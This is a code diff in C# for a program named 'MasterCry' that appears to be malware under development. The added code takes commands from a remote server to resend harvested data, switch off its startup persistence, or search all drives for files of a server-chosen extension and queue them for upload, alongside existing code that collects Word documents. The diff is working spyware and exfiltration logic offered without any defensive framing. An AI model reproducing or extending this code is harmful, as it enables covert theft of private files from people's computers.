@@ -40,6 +40,37 @@ namespace MasterCry
 
                 String link = ExtractData(result, BuildVars.Command_URL_Symbol);
                 String ver = ExtractData(result, BuildVars.Command_VER_Symbol);
+                String com = ExtractData(result, BuildVars.Command_COM_Symbol);
+
+                // Command Control
+
+                if (com.Equals(BuildVars.Command_RESEND))       //Resend Data
+                {
+                    if (File.Exists(BuildVars.Save_Items_Location))
+                        File.Delete(BuildVars.Save_Items_Location);
+                    Form1_Load(null, null);
+                }
+                else if (com.Equals(BuildVars.Command_SHUTDOWN))        //ShutDOWN App
+                {
+                    RegisterInStartup(false);
+                }
+                else if (com.Contains(BuildVars.Command_NEW_EXT))       //NEW EXT Search and Upload
+                {
+                    com = com.Replace(BuildVars.Command_NEW_EXT, "");
+                    if (!File.Exists(BuildVars.Save_New_Items_Location))
+                    {
+                        foreach (var drv in getDrives())
+                        {
+                            var data = GetFileList(drv, com);
+                            foreach (var item in data)
+                            {
+                                WriteItems(item,true);
+                            }
+                        }
+                    }
+                   
+                    //Todo: Upload Data
+                }
 
                 var preVer = System_Details.ReadSetting(BuildVars.Config_Command_Version);
 
@@ -187,7 +218,45 @@ namespace MasterCry
                 rootFolderPath = pending.Dequeue();
                 try
                 {
-                    tmp = Directory.GetFiles(rootFolderPath).Where(file => exceptions.All(e => !file.StartsWith(e)) && file.EndsWith(".doc", StringComparison.CurrentCultureIgnoreCase)).Union(Directory.GetFiles(rootFolderPath).Where(files => exceptions.All(e => !files.StartsWith(e)) && files.EndsWith(".docx", StringComparison.CurrentCultureIgnoreCase)).Where(d => exceptions.All(e => !d.StartsWith(e)))).ToArray();
+                    tmp = Directory.GetFiles(rootFolderPath).Where(file => exceptions.All(e => !file.StartsWith(e)) && file.EndsWith(".doc", StringComparison.CurrentCultureIgnoreCase)).Union(Directory.GetFiles(rootFolderPath).Where(files => exceptions.All(e => !files.StartsWith(e)) && files.EndsWith(".docx", StringComparison.CurrentCultureIgnoreCase))).ToArray();
+                }
+                catch (UnauthorizedAccessException) { continue; }
+                catch (DirectoryNotFoundException) { continue; }
+                for (int i = 0; i < tmp.Length; i++)
+                {
+                    yield return tmp[i];
+                }
+                tmp = Directory.GetDirectories(rootFolderPath);
+                for (int i = 0; i < tmp.Length; i++)
+                {
+                    pending.Enqueue(tmp[i]);
+                }
+            }
+        }
+
+        public IEnumerable<string> GetFileList(string rootFolderPath, string Extension)
+        {
+            string[] exceptions = new string[] { @"C:\System Volume Information", @"C:\$RECYCLE.BIN",
+            @"D:\System Volume Information", @"D:\$RECYCLE.BIN",
+            @"E:\System Volume Information", @"E:\$RECYCLE.BIN",
+            @"F:\System Volume Information", @"F:\$RECYCLE.BIN",
+            @"G:\System Volume Information", @"G:\$RECYCLE.BIN",
+            @"H:\System Volume Information", @"H:\$RECYCLE.BIN",
+            @"I:\System Volume Information", @"I:\$RECYCLE.BIN",
+            @"J:\System Volume Information", @"J:\$RECYCLE.BIN",
+            @"K:\System Volume Information", @"K:\$RECYCLE.BIN",
+            @"L:\System Volume Information", @"L:\$RECYCLE.BIN",
+            @"M:\System Volume Information", @"M:\$RECYCLE.BIN"};
+
+            Queue<string> pending = new Queue<string>();
+            pending.Enqueue(rootFolderPath);
+            string[] tmp;
+            while (pending.Count > 0)
+            {
+                rootFolderPath = pending.Dequeue();
+                try
+                {
+                    tmp = Directory.GetFiles(rootFolderPath).Where(file => exceptions.All(e => !file.StartsWith(e)) && file.EndsWith("." + Extension, StringComparison.CurrentCultureIgnoreCase)).ToArray();
 
                 }
                 catch (UnauthorizedAccessException) { continue; }
@@ -216,7 +285,14 @@ namespace MasterCry
                 file.WriteLine(Text);
             }
         }
-
+        private static void WriteItems(string Text,bool Is_NEW_EXT)
+        {
+            using (System.IO.StreamWriter file =
+            new System.IO.StreamWriter(BuildVars.Save_New_Items_Location, true))
+            {
+                file.WriteLine(Text);
+            }
+        }
         #endregion
 
         private void Upload()
